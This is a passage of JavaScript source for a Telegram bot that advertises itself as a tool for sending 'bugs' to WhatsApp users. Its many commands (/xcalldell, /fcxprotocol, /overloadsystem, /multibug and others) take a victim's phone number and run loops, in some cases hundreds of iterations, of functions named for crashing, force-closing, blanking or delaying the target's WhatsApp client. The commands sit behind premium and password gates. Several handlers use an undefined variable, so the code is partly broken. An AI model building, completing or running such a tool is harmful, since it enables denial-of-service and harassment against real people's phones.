  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /viperlayinvis
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisVnXNew(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("unknown2", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /unknown2 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /unknown2
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisVnXNew(sock, target);      
      await sleep(3500);
    }
  })();
});
bot.command("xsticker", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xsticker 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xsticker
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayStikerNullNew(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("combodelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /combodelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /combodelay
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisSpam(sock, target);
      await DelayStikerNullNew(sock, target);   
      await sleep(1000);
    }
  })();
});
bot.command("unknown1", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }


  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /unknown1 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /unknown1
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashInvisNewVnX(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("xhot", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xhot 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xhot
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await KhasJawaForcloseInvisNew(target);
      await sleep(500);
    }
  })();
});
bot.command("xcalldell", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xcalldell 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xcalldell
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await ZhTForceDelete(sock, target);
      await sleep(2500);
    }
  })();
});
bot.command("casebug3", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /casebug3 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /casebug3
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashWithStiker(sock, target);
      await sleep(1500);
    }
  })();
});
bot.command("xmetafc", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xmetafc 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xmetafc
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 2; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await LocaUrlButton(sock, target, Ptcp = true);  
      await sleep(500);
    }
  })();
});
bot.command("vionixlayfc", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /viperlayfc 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /viperlayfc
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await epcihDiley(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("fcxprotocol", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /fcxprotocol 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /fcxprotocol
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXCrashPronew(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("xhoymsgxblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xhoymsgxblank 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xhoymsgxblank
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 250; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXCrashPro(sock, target);  
      await sleep(1000);
      await VnXCrashProMax(sock, target);
      await sleep(1500);
      await VnXCrashProSuperMax(sock, target);
      await sleep(2000);
      await VnXCrashSuperMax(sock, target);
      await sleep(2500);
      await BlankGcSenn(target);
      await sleep(3000);
    }
  })();
});
bot.command("fcxlocainvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /fcxlocainvis 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /fcxlocainvis
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await CrashInvisNewVnX(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("uihardsuper", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uihardsuper 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uihardsuper
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 250; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);  
      await sleep(3500);
    }
  })();
});
bot.command("uihard", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  if (!q) return ctx.reply(`Example: /uihard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uihard
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("unknown3", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  if (!q) return ctx.reply(`Example: /unknown3 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /unknown3
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);  
      await sleep(1500);
    }
  })();
});
bot.command("uimedium", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uimedium 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uimedium
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("uieasy", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

   

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  if (!q) return ctx.reply(`Example: /uieasy 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uieasy
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 30; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("overloadsystem", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /overloadsystem 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /overloadsystem
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);  
      await sleep(1000);
    }
  })();
});
bot.command("multibug", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
    const text = ctx.message.text;
    const args = text.split(" ").slice(1).join(" ");    

    if (!args) {
      return ctx.reply(
        "❌ *Example*\n\n" +
        "📌 Do This:\n" +
        "`/multibug 628xxx, 491xxxx, 3737xxxx`"
      );
    }

    const numbers = args
      .split(",")
      .map(v => v.replace(/[^0-9]/g, ""))
      .filter(v => v.length > 5);

    if (numbers.length === 0) {
      return ctx.reply("❌ Tidak ada nomor valid yang bisa diproses.");
    }

    const targets = numbers.map(n => n + "@s.whatsapp.net");
    const totalTarget = targets.length;

    let progressMsg = await ctx.reply(
      "🚀 **MULTI BUG STARTED**\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `⏳ Status       : Initializing...\n` +
      `📊 Progress     : 0%`
    );

    for (let index = 0; index < targets.length; index++) {
      const target = targets[index];
      const current = index + 1;
      const percent = Math.floor((current / totalTarget) * 100);

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        "⚡ *MULTI BUG IN PROGRESS*\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `🛠 Step          : Preparing...`
      );

      const loopBug = 10;
      for (let i = 0; i < loopBug; i++) {
        await sleep(500);
        await DelayHardSwVnX(sock, target, mention = true);
        await VnXDeck(sock, target);
        await sleep(1000);
        await VnXBulldo(sock, target);
        await sleep(1500);

        console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${maxLoop}`);
      }

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
